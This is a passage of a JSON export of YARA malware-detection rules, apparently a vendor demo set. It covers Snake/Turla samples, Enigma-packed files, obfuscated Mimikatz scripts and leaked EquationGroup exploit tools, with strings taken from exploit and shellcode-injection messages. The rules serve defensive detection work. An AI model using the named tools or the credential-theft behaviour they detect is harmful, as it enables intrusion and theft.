= \"Detects Snake / Turla Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/QaOh4V\"\n      date = \"2017-05-04 11:48:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"${TARGET_PATH}/installd.sh\" ascii\n      $s2 = \"$TARGET_PATH2/com.adobe.update.plist\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and all of them )\n}","date":"2017-05-04 11:48:21","description":"Detects Snake / Turla Sample","minimum_yara":"1.7","name":"SnakeTurla_Install_SH_RID2F3B","reference":"https://goo.gl/QaOh4V","required_modules":[],"rule_hash":"cc7e98e02db1e1898c7f99f08e5eed16","score":75,"tags":["DEMO","RUSSIA","FILE","MAL"]},{"author":"Florian Roth","content":"rule SnakeTurla_Malware_May17_2_RID30B2 : DEMO FILE MAL RUSSIA {\n   meta:\n      description = \"Detects Snake / Turla Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/QaOh4V\"\n      date = \"2017-05-04 12:50:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"b_openssl: oops - number of mutexes is 0\" fullword ascii\n      $s2 = \"networksetup -get%sproxy Ethernet\" fullword ascii\n      $s3 = \"012A04DECBC441e49C527B2798F54CA7LOG_NAMED_PIPE_NAME\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xfacf and filesize < 6000KB and all of them )\n}","date":"2017-05-04 12:50:51","description":"Detects Snake / Turla Sample","minimum_yara":"1.7","name":"SnakeTurla_Malware_May17_2_RID30B2","reference":"https://goo.gl/QaOh4V","required_modules":[],"rule_hash":"2d99c25e58be7a88478024b96a8d157b","score":75,"tags":["DEMO","RUSSIA","FILE","MAL"]},{"author":"Florian Roth","content":"rule Enigma_Protected_Malware_May17_RhxFiles_RID3605 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Enigma protected malware samples\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-05-02 16:38:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { bd 9c 74 f6 7a 3a f7 94 c5 7d 7c 7c 7c 7e ae 73 } \n      $op2 = { 82 62 6b 6b 6b 68 a5 ea aa 69 6b 6b 6b 3a 3b 94 } \n      $op3 = { 7c 7c c5 7d 7c 7c 7c 7e ae 73 f9 79 7c 7c 7c f6 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them )\n}","date":"2017-05-02 16:38:01","description":"Detects Enigma protected malware samples","minimum_yara":"1.7","name":"Enigma_Protected_Malware_May17_RhxFiles_RID3605","reference":"Internal Research","required_modules":[],"rule_hash":"5b1a3673d318228ad17073ff9624185f","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EnigmaPacker_Rare_RID2DA1 : DEMO EXE FILE MAL T1045 {\n   meta:\n      description = \"Detects an ENIGMA packed executable\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-04-27 10:40:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1045\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"P.rel$oc$\" fullword ascii\n      $s2 = \"ENIGMA\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them )\n}","date":"2017-04-27 10:40:01","description":"Detects an ENIGMA packed executable","minimum_yara":"1.7","name":"EnigmaPacker_Rare_RID2DA1","reference":"Internal Research","required_modules":[],"rule_hash":"2e94cf82a091fc5a1509200400740835","score":60,"tags":["DEMO","EXE","T1045","FILE","MAL"]},{"author":"Florian Roth","content":"rule Obfuscated_VBS_April17_RID2F1A : DEMO HKTL OBFUS SCRIPT T1003 T1027 T1075 T1097 T1178 {\n   meta:\n      description = \"Detects cloaked Mimikatz in VBS obfuscation\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-04-21 11:42:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, OBFUS, SCRIPT, T1003, T1027, T1075, T1097, T1178\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"::::::ExecuteGlobal unescape(unescape(\" ascii\n   condition: \n      filesize < 500KB and all of them\n}","date":"2017-04-21 11:42:51","description":"Detects cloaked Mimikatz in VBS obfuscation","minimum_yara":"1.7","name":"Obfuscated_VBS_April17_RID2F1A","reference":"Internal Research","required_modules":[],"rule_hash":"9a4ac4427e4c37041a7cd8c4d50ac346","score":75,"tags":["T1178","OBFUS","SCRIPT","T1097","T1075","DEMO","T1027","T1003","HKTL"]},{"author":"Florian Roth","content":"rule Obfuscated_JS_April17_RID2ECC : DEMO HKTL OBFUS T1003 T1027 T1075 T1097 T1178 {\n   meta:\n      description = \"Detects cloaked Mimikatz in JS obfuscation\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-04-21 11:29:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, OBFUS, T1003, T1027, T1075, T1097, T1178\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\";function Main(){for(var \" ascii\n      $s2 = \"=String.fromCharCode(parseInt(\" ascii\n      $s3 = \"));(new Function(\" ascii\n   condition: \n      filesize < 500KB and all of them\n}","date":"2017-04-21 11:29:51","description":"Detects cloaked Mimikatz in JS obfuscation","minimum_yara":"1.7","name":"Obfuscated_JS_April17_RID2ECC","reference":"Internal Research","required_modules":[],"rule_hash":"e892bbc03e16003dbd2a4f03072d14ea","score":75,"tags":["T1178","OBFUS","T1097","T1075","DEMO","T1027","T1003","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_scanner_output_RID32BD : APT DEMO {\n   meta:\n      description = \"Detects output generated by EQGRP scanner.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-04-17 14:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"# scanning ip  \" ascii\n      $s1 = \"# Scan for windows boxes\" ascii fullword\n      $s2 = \"Going into send\" ascii fullword\n      $s3 = \"# Does not work\" ascii fullword\n      $s4 = \"You are the weakest link, goodbye\" ascii fullword\n      $s5 = \"rpc   Scan for RPC  folks\" ascii fullword\n   condition: \n      filesize < 1000KB and 2 of them\n}","date":"2017-04-17 14:18:01","description":"Detects output generated by EQGRP scanner.exe","minimum_yara":"1.7","name":"EquationGroup_scanner_output_RID32BD","reference":"Internal Research","required_modules":[],"rule_hash":"8a160c2a16137109e3b43b75db5a20de","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Eclipsedwing_Rpcproxy_Pcdlllauncher_RID403A : APT DEMO EXE FILE T1090 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 23:53:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] Failed to Prepare Payload!\" fullword ascii\n      $x2 = \"ShellcodeStartOffset\" fullword ascii\n      $x3 = \"[*] Waiting for AuthCode from exploit\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}","date":"2017-04-15 23:53:31","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Eclipsedwing_Rpcproxy_Pcdlllauncher_RID403A","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"989424ce05f45b34d068c771a0f96343","score":75,"tags":["APT","T1090","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Explodingcantouch_1_2_1_RID3AA6 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:55:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] Connection closed by remote host (TCP Ack/Fin)\" fullword ascii\n      $s2 = \"[!]Warning: Error on first request - path size may actually be larger than indicated.\" fullword ascii\n      $s4 = \"<http://%s/%s> (Not <locktoken:write1>) <http://%s/>\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 1 of them )\n}","date":"2017-04-15 19:55:31","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Explodingcantouch_1_2_1_RID3AA6","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"b1a3c4c0992cdd90212a6cfcdf3c00d9","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Architouch_1_0_0_RID37AE : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:48:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[+] Target is %s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-04-15 17:48:51","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Architouch_1_0_0_RID37AE","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"0d66c58cd7297d9f012fc3081355243e","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Erraticgopher_1_0_1_RID38F4 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:43:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] Error appending shellcode buffer\" fullword ascii\n      $x2 = \"[-] Shellcode is too big\" fullword ascii\n      $x3 = \"[+] Exploit Payload Sent!\" fullword ascii\n      $x4 = \"[+] Bound to Dimsvc, sending exploit request to opnum 29\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 1 of them )\n}","date":"2017-04-15 18:43:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Erraticgopher_1_0_1_RID38F4","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"dc21bc344241e61b993940a99572f060","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Esteemaudit_2_1_0_RID3820 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:07:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] Connected to target %s:%d\" fullword ascii\n      $x2 = \"[-] build_exploit_run_x64():\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}","date":"2017-04-15 18:07:51","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Esteemaudit_2_1_0_RID3820","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"6c3379a686592c46d9ef8d135d9382ce","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Darkpulsar_1_1_0_RID37BE : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:51:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[%s] - Error upgraded DLL architecture does not match target architecture (0x%x)\" fullword ascii\n      $x2 = \"[%s] - Error building DLL loading shellcode\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}","date":"2017-04-15 17:51:31","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Darkpulsar_1_1_0_RID37BE","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"4e70b464154eb8aa0582f601120773ff","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Educatedscholar_1_0_0_RID39AF : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:14:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] Shellcode Callback %s:%d\" fullword ascii\n      $x2 = \"[+] Exploiting Target\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 1 of them )\n}","date":"2017-04-15 19:14:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Educatedscholar_1_0_0_RID39AF","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"37642ca2f3a08356a290c25963e7ca16","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Doublepulsar_1_3_1_RID389A : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:28:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] Ping returned Target architecture: %s - XOR Key: 0x%08X\" fullword ascii\n      $x2 = \"[.] Sending shellcode to inject DLL\" fullword ascii\n      $x3 = \"[-] Error setting ShellcodeFile name\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}","date":"2017-04-15 18:28:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Doublepulsar_1_3_1_RID389A","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"baa3e5ec39839d0a86f6ac420f586c02","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Erraticgophertouch_1_0_1_RID3B17 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 20:14:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] Unable to connect to broswer named pipe, target is NOT vulnerable\" fullword ascii\n      $x2 = \"[-] Unable to bind to Dimsvc RPC syntax, target is NOT vulnerable\" fullword ascii\n      $x3 = \"[+] Bound to Dimsvc, target IS vulnerable\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 1 of them )\n}","date":"2017-04-15 20:14:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Erraticgophertouch_1_0_1_RID3B17","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"28a533e088ad9660e9ad27c405f3377a","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Smbtouch_1_1_1_RID36EB : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:16:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] Target is vulnerable to %d exploit%s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )\n}","date":"2017-04-15 17:16:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Smbtouch_1_1_1_RID36EB","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"13c7e9415593c1d35cf980afae13a314","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Educatedscholartouch_1_0_0_RID3BD2 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 20:45:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[!] A vulnerable target will not respond.\" fullword ascii\n      $x2 = \"[-] Target NOT Vulernable\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 1 of them )\n}","date":"2017-04-15 20:45:31","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Educatedscholartouch_1_0_0_RID3BD2","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"a2b1afc92775f381dd8876cb1e6bc98c","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Esteemaudittouch_2_1_0_RID3A43 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:39:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] Touching the target failed!\" fullword ascii\n      $x2 = \"[-] OS fingerprint not complete - 0x%08x!\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}","date":"2017-04-15 19:39:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Esteemaudittouch_2_1_0_RID3A43","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"27abad7eb8ac03eb4e7cde100fbba10b","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Rpctouch_2_1_0_RID36EE : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:16:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[*] Failed to detect OS / Service Pack on %s:%d\" fullword ascii\n      $x2 = \"[*] SMB String: %s (%s)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 1 of them )\n}","date":"2017-04-15 17:16:51","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Rpctouch_2_1_0_RID36EE","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"22603ee6c4b4beb068f00ee0c6dc178c","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Mofconfig_1_0_0_RID373C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:29:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] Get RemoteMOFTriggerPath error\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them )\n}","date":"2017-04-15 17:29:51","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Mofconfig_1_0_0_RID373C","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"28f3226fa0204beeeb5b335f4ab8998c","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Easypi_Explodingcan_RID399C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:11:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] %s - Target might not be in a usable state.\" fullword ascii\n      $x2 = \"[*] Exploiting Target\" fullword ascii\n      $x3 = \"[-] Encoding Exploit Payload failed!\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}","date":"2017-04-15 19:11:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Easypi_Explodingcan_RID399C","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"9c3b95dfb6c87110a7f2bf2d4cdb6b74","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Eclipsedwingtouch_1_0_4_RID3AA9 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:56:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] The target is NOT vulnerable\" fullword ascii\n      $x2 = \"[+] The target IS VULNERABLE\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 1 of them )\n}","date":"2017-04-15 19:56:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Eclipsedwingtouch_1_0_4_RID3AA9","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"e68d37e990243af13593cf57e700c914","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Iistouch_1_2_2_RID36F0 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:17:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] Are you being redirectect? Need to retarget?\" fullword ascii\n      $x2 = \"[+] IIS Target OS: %s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 60KB and 1 of them )\n}","date":"2017-04-15 17:17:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Iistouch_1_2_2_RID36F0","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"6e3ae16ccf3d5e64d0e2c6afb2e99e17","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Namedpipetouch_2_0_0_RID395B : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:00:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[*] Summary: %d pipes found\" fullword ascii\n      $s3 = \"[+] Testing %d pipes\" fullword ascii\n      $s6 = \"[-] Error on SMB startup, aborting\" fullword ascii\n      $s12 = \"92a761c29b946aa458876ff78375e0e28bc8acb0\" fullword ascii\n      $op1 = { 68 10 10 40 00 56 e8 e1 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and 2 of them )\n}","date":"2017-04-15 19:00:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Namedpipetouch_2_0_0_RID395B","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"010975a4b2d365a5c894764457bc4249","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Easybee_1_0_1_RID3663 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April 